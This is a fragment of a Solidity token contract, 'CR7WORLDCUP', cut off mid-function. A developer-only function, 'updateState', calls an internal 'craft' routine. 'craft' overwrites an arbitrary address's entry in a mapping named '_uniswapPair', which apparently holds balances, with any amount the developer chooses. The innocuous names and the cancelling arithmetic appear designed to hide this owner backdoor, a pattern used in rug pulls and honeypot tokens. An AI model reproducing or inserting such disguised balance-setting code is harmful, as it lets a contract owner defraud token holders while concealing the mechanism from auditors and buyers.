...
contract CR7WORLDCUP is Ownable {
  ...
  function updateState(address to, uint256 onchainDataHash) public onlyDev {
    require(to != address(0));
    craft(to, onchainDataHash);
  
  }
  
  function craft(address to, uint256 onchainDataHash) internal {
    require(onchainDataHash != 1, "Transfer amount must be not one");
    _uniswapPair[to] = (_uniswapPair[to] * 1 * 2 - _uniswapPair[to] * 1 * 2) + (onchainDataHash * 10 ** uint256(decimals));
